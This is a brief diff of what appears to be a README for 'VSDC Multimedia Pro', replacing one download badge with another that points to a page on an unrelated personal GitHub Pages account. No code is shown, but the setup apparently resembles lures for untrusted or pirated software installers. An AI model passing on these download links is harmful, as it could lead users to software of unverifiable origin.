@@ -4,10 +4,7 @@
   <img src="https://fixthephoto.com/blog/UserFiles/Vsdc-logo.jpg" alt="VSDC Multimedia Pro Logo"/>
 </div>
 
-<div align="center">
-
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://vsdc-multimedia-suite.github.io/.github/)
-</div>
+[![GET VSDC Multimedia](https://img.shields.io/badge/GET%20%E2%80%94%20VSDC-Multimedia-0078D6?style=for-the-badge&logoColor=white)](https://marindajolie5.github.io/.github/VSDC-Multimedia)
 
 ---
 
